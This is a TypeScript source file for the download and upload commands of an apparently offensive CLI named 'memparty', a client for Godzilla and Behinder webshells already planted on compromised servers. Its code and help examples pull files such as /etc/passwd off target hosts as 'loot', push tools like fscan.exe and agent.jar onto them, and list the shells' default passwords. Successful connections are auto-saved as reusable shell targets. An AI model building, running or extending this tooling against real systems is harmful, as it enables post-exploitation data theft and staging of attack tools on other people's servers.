import { writeFileSync } from "node:fs";

import { Command, Option } from "commander";

import { logInfo, reportError, type GlobalOptions } from "../cli-context.js";
import {
  protocolNames,
  requireProtocol,
  unsupportedMessage,
  type ProtocolOptions,
} from "../connect/registry.js";
import type {
  CommonConnectOptions,
  DownloadResult,
  TransferResult,
} from "../connect/types.js";
import { readUploadFile, resolveDownloadPath } from "../core/localfile.js";
import { logOp } from "../core/oplog.js";
import { autoSaveShell, resolveConnection, type ResolvedConnection } from "../core/targets.js";

interface TransferCmdOptions extends GlobalOptions {
  url?: string;
  tool?: string;
  pass?: string;
  key?: string;
  headerName?: string;
  headerValue?: string;
  header?: string[];
  insecure?: boolean;
  json?: boolean;
  save?: boolean;
  output?: string;
  force?: boolean;
  remoteCharset?: string;
}

function parseExtraHeaders(lines: string[] | undefined): Record<string, string> {
  const headers: Record<string, string> = {};
  for (const line of lines ?? []) {
    const idx = line.indexOf(":");
    if (idx <= 0) {
      throw new Error(`invalid header ${JSON.stringify(line)}, expected "Name: value"`);
    }
    headers[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
  }
  return headers;
}

interface ResolvedTransfer {
  conn: ResolvedConnection;
  common: CommonConnectOptions;
}

/** Resolve the target connection; on failure report + set exit code, return null. */
function resolveTransfer(
  name: string | undefined,
  opts: TransferCmdOptions,
  timeoutMs: number,
): ResolvedTransfer | null {
  let conn: ResolvedConnection;
  try {
    conn = resolveConnection(name, {
      url: opts.url,
      tool: opts.tool,
      pass: opts.pass,
      key: opts.key,
      headerName: opts.headerName,
      headerValue: opts.headerValue,
      extraHeaders: parseExtraHeaders(opts.header),
      insecure: opts.insecure,
    });
  } catch (err) {
    reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
    process.exitCode = 1;
    return null;
  }
  return {
    conn,
    common: {
      headerName: conn.headerName,
      headerValue: conn.headerValue,
      extraHeaders: conn.extraHeaders,
      timeoutMs,
      insecure: conn.insecure,
    },
  };
}

/** A successful transfer proves the credentials — keep them as a named target. */
function maybeAutoSave(conn: ResolvedConnection, opts: TransferCmdOptions): string | undefined {
  if (conn.targetName !== undefined || opts.save === false) return undefined;
  const savedAs = autoSaveShell(conn);
  conn.targetName = savedAs;
  return savedAs;
}

function printResult(
  result: TransferResult,
  localPath: string,
  savedAs: string | undefined,
  json: boolean | undefined,
): void {
  if (json) {
    // a DownloadResult carries the file bytes in `data` — never print those
    const { data: _data, ...wire } = result as DownloadResult;
    process.stdout.write(`${JSON.stringify({ ...wire, localPath, savedAs }, null, 2)}\n`);
    return;
  }
  if (result.ok) {
    const [from, to] =
      result.direction === "download"
        ? [result.remotePath, localPath]
        : [localPath, result.remotePath];
    process.stdout.write(
      `${result.direction === "download" ? "downloaded" : "uploaded"} ${result.bytes ?? 0} bytes: ` +
        `${from} -> ${to} (${result.tool}, ${result.durationMs}ms)\n`,
    );
    if (result.detail) logInfo(`note: ${result.detail}`);
    if (savedAs) logInfo(`saved as '${savedAs}' (use --no-save to skip)`);
  } else {
    process.stderr.write(
      `FAIL ${result.direction} ${result.tool} ${result.url}\n     ${result.error ?? ""}\n`,
    );
  }
}

export function registerDownloadCommand(program: Command): void {
  program
    .command("download")
    .description("Download a file from a deployed webshell")
    .argument("[name]", "saved target name (see 'memparty list')")
    .argument("[remote]", "remote file path")
    .option("-u, --url <url>", "URL of the deployed shell (or give a saved target name)")
    .addOption(
      new Option("-t, --tool <tool>", "shell protocol").choices(protocolNames("download")),
    )
    .option("-o, --output <file>", "local destination (a directory keeps the remote basename)")
    .option("--force", "overwrite an existing local file")
    .option("--pass <pass>", "password (godzilla default: pass; behinder default: rebeyond)")
    .option("--key <key>", "godzilla key (default: key)")
    .option(
      "--remote-charset <label>",
      "godzilla: charset for non-ASCII remote paths (e.g. GBK; default UTF-8)",
    )
    .option(
      "--header-name <name>",
      "gate header name reported by gen (shellToolConfig.headerName)",
    )
    .option(
      "--header-value <value>",
      "gate header value reported by gen (shellToolConfig.headerValue)",
    )
    .option("-H, --header <line...>", 'extra request header, e.g. -H "Cookie: a=b"')
    .option("-k, --insecure", "skip TLS certificate verification")
    .option("--json", "output raw JSON")
    .option("--no-save", "do not auto-save the target after a successful download")
    .addHelpText(
      "after",
      `
Examples:
  $ memparty download -u http://target/shell.jsp -t godzilla --pass pass --key key \\
      --header-value my-secret-token /etc/passwd -o loot-passwd
  $ memparty download web222 C:\\Windows\\win.ini        # saved target
  $ memparty download web222 /var/log/app.log -o logs/ --json

Integrity: godzilla verifies the transferred size; behinder additionally
compares the remote MD5 against the received bytes. An existing local file
is never overwritten unless --force is given.
`,
    )
    .action(async (name: string | undefined, remote: string | undefined, opts: TransferCmdOptions, cmd: Command) => {
      const globals = cmd.optsWithGlobals() as GlobalOptions & { timeout?: string };
      const timeoutMs = Number.parseInt(globals.timeout ?? "30000", 10);

      // `download <remote>` or `download <name> <remote>`
      let targetName = name;
      let remotePath = remote;
      if (remotePath === undefined) {
        remotePath = name;
        targetName = undefined;
      }
      if (!remotePath) {
        reportError("missing remote file path — usage: memparty download [name] <remote>", opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      const resolved = resolveTransfer(targetName, opts, timeoutMs);
      if (!resolved) return;
      const { conn, common } = resolved;

      // decide + validate the local destination before touching the network
      let localPath: string;
      try {
        localPath = resolveDownloadPath(remotePath, opts.output, opts.force ?? false);
      } catch (err) {
        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      let result: DownloadResult;
      try {
        const protocol = requireProtocol(conn.tool);
        if (!protocol.download) {
          reportError(unsupportedMessage(protocol, "download"), opts.json ? ["--json"] : []);
          process.exitCode = 1;
          return;
        }
        const options: ProtocolOptions = { remoteCharset: opts.remoteCharset };
        result = await protocol.download({ conn, common, options }, remotePath);
      } catch (err) {
        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      let writeError: string | undefined;
      if (result.ok && result.data !== undefined) {
        try {
          writeFileSync(localPath, result.data);
        } catch (err) {
          writeError = `download succeeded but writing ${localPath} failed: ${
            err instanceof Error ? err.message : String(err)
          }`;
          result = { ...result, ok: false, error: writeError };
        }
      }

      const savedAs = result.ok ? maybeAutoSave(conn, opts) : undefined;
      logOp({
        category: "download",
        action: "download",
        targetName: conn.targetName,
        url: conn.url,
        tool: conn.tool,
        ok: result.ok,
        durationMs: result.durationMs,
        detail: result.ok ? `${remotePath} -> ${localPath} (${result.bytes ?? 0} bytes)` : undefined,
        error: result.error,
        meta: { remotePath, localPath, bytes: result.bytes },
      });

      printResult(result, localPath, savedAs, opts.json);
      if (!result.ok) process.exitCode = 1;
    });
}

export function registerUploadCommand(program: Command): void {
  program
    .command("upload")
    .description("Upload a local file to a deployed webshell")
    .argument("[name]", "saved target name (see 'memparty list')")
    .argument("[local]", "local file path")
    .argument("[remote]", "remote destination path")
    .option("-u, --url <url>", "URL of the deployed shell (or give a saved target name)")
    .addOption(
      new Option("-t, --tool <tool>", "shell protocol").choices(protocolNames("upload")),
    )
    .option("--pass <pass>", "password (godzilla default: pass; behinder default: rebeyond)")
    .option("--key <key>", "godzilla key (default: key)")
    .option(
      "--remote-charset <label>",
      "godzilla: charset for non-ASCII remote paths (e.g. GBK; default UTF-8)",
    )
    .option(
      "--header-name <name>",
      "gate header name reported by gen (shellToolConfig.headerName)",
    )
    .option(
      "--header-value <value>",
      "gate header value reported by gen (shellToolConfig.headerValue)",
    )
    .option("-H, --header <line...>", 'extra request header, e.g. -H "Cookie: a=b"')
    .option("-k, --insecure", "skip TLS certificate verification")
    .option("--json", "output raw JSON")
    .option("--no-save", "do not auto-save the target after a successful upload")
    .addHelpText(
      "after",
      `
Examples:
  $ memparty upload -u http://target/shell.jsp -t behinder --pass rebeyond \\
      --header-value my-secret-token fscan.exe C:\\Windows\\Temp\\f.exe
  $ memparty upload web222 ./agent.jar /tmp/agent.jar --json

Upload overwrites the remote file (truncate + write). Integrity: godzilla
verifies the remote size afterwards; behinder compares MD5. A failed upload
chunk aborts the transfer — the remote file may be left partial.
`,
    )
    .action(async (name: string | undefined, local: string | undefined, remote: string | undefined, opts: TransferCmdOptions, cmd: Command) => {
      const globals = cmd.optsWithGlobals() as GlobalOptions & { timeout?: string };
      const timeoutMs = Number.parseInt(globals.timeout ?? "30000", 10);

      // `upload <local> <remote>` or `upload <name> <local> <remote>`
      let targetName = name;
      let localPath = local;
      let remotePath = remote;
      if (remotePath === undefined) {
        remotePath = local;
        localPath = name;
        targetName = undefined;
      }
      if (!localPath || !remotePath) {
        reportError("missing paths — usage: memparty upload [name] <local> <remote>", opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      const resolved = resolveTransfer(targetName, opts, timeoutMs);
      if (!resolved) return;
      const { conn, common } = resolved;

      // read + validate the local file before touching the network
      let data: Buffer;
      try {
        data = readUploadFile(localPath);
      } catch (err) {
        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      let result: TransferResult;
      try {
        const protocol = requireProtocol(conn.tool);
        if (!protocol.upload) {
          reportError(unsupportedMessage(protocol, "upload"), opts.json ? ["--json"] : []);
          process.exitCode = 1;
          return;
        }
        const options: ProtocolOptions = { remoteCharset: opts.remoteCharset };
        result = await protocol.upload({ conn, common, options }, remotePath, data);
      } catch (err) {
        reportError(err instanceof Error ? err.message : String(err), opts.json ? ["--json"] : []);
        process.exitCode = 1;
        return;
      }

      const savedAs = result.ok ? maybeAutoSave(conn, opts) : undefined;
      logOp({
        category: "upload",
        action: "upload",
        targetName: conn.targetName,
        url: conn.url,
        tool: conn.tool,
        ok: result.ok,
        durationMs: result.durationMs,
        detail: result.ok ? `${localPath} -> ${remotePath} (${result.bytes ?? 0} bytes)` : undefined,
        error: result.error,
        meta: { localPath, remotePath, bytes: result.bytes },
      });

      printResult(result, localPath, savedAs, opts.json);
      if (!result.ok) process.exitCode = 1;
    });
}
